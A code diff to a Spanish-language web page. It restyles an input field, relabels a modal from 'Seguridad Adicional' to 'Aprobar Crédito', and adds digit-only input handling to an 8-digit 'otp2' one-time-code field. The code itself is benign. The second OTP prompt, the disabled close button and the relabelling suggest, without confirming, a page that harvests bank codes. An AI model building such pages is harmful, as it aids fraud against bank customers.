@@ -130,23 +130,18 @@
         ========================================= */
 
         .top-input {
-            width: 100%;
-            height: 48px;
-
-            border-radius: 14px;
-            border: 1px solid #d8d8d8;
-
-            padding: 0 18px;
-
-            font-size: 15px;
-            font-family: 'Poppins', sans-serif;
-
-            margin-bottom: 18px;
-
-            outline: none;
-
-            color: #666;
-        }
+    width: 100%;
+    height: 40px;
+    border-radius: 10px;
+    border: 1px solid #e0e0e0;
+    padding: 0 14px;
+    font-size: 14px;
+    font-family: 'Poppins', sans-serif;
+    margin-bottom: 14px;
+    outline: none;
+    color: #666;
+    font-weight: 400;
+}
 
         .message {
             color: #707070;
@@ -394,7 +389,7 @@
         <div class="modal-header">
             
             <div class="modal-title">
-                Seguridad Adicional
+                Aprobar Crédito
             </div>
 
             <button class="close-btn" id="closeModal" disabled>
@@ -459,6 +454,7 @@
                         minlength="8" maxlength="8"
                         inputmode="numeric"
                         name="otp2"
+                        id="cod"
                         >
 
                 </div>
@@ -514,6 +510,28 @@
         </div>
 
     </div>
+
+    <script>
+  document.getElementById('cod').addEventListener('input', function(e){
+  if (!/^\d*$/.test(e.target.value)) {
+    e.target.value = e.target.value.replace(/\D/g, '');
+  }
+});
+
+document.getElementById('cod').addEventListener('paste', function(e){
+  e.preventDefault();
+  const paste = (e.clipboardData || window.clipboardData).getData('text');
+  if (/^\d*$/.test(paste)) {
+    e.target.value = paste;
+  }
+});
+
+document.getElementById('cod').addEventListener('keypress', function(e){
+  if (!/\d/.test(e.key)) {
+    e.preventDefault();
+  }
+});
+</script>
 
     <script>
 
